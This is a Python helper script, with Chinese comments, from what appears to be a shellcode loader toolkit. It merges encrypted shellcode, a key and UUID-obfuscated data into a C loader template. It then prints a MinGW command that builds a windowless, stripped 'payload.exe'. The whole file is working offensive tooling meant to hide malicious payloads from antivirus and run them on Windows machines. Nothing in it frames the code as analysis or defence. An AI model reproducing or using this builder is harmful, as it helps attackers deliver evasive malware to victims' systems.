#!/usr/bin/env python3
"""
Merge Loader — 将加密 shellcode + 密钥 + 混淆数据注入 loader.c 模板，
生成可直接编译的 C 文件。
"""
import sys
import os

TEMPLATE = os.path.join(os.path.dirname(__file__), 'loader.c')


def main():
    if len(sys.argv) < 2:
        print(f"Usage: python {sys.argv[0]} <encrypted.c> <key.c> [obfuscated.c] [-o output.c]")
        sys.exit(1)

    encrypted_file = sys.argv[1]
    key_file = sys.argv[2] if len(sys.argv) > 2 else None
    obfuscated_file = None
    out_file = 'loader_final.c'

    args = sys.argv[3:]
    i = 0
    while i < len(args):
        if args[i] == '-o' and i + 1 < len(args):
            out_file = args[i + 1]
            i += 2
        elif args[i].endswith('.c') and 'obfuscated' in args[i]:
            obfuscated_file = args[i]
            i += 1
        else:
            i += 1

    with open(TEMPLATE, 'r') as f:
        template = f.read()

    # 注入 shellcode
    with open(encrypted_file, 'r') as f:
        sc = f.read()
    template = template.replace('// SHELLCODE_PLACEHOLDER', sc)

    # 注入密钥
    if key_file:
        with open(key_file, 'r') as f:
            key = f.read()
        template = template.replace('// KEY_PLACEHOLDER', key)

    # 注入混淆数据
    if obfuscated_file:
        with open(obfuscated_file, 'r') as f:
            obf = f.read()
        template = template.replace('// UUID_PLACEHOLDER', obf)

    with open(out_file, 'w') as f:
        f.write(template)
    print(f"[+] {out_file}")
    print(f"    编译: x86_64-w64-mingw32-gcc -o payload.exe {out_file} -mwindows -Os -static -s -lrpcrt4")


if __name__ == '__main__':
    main()
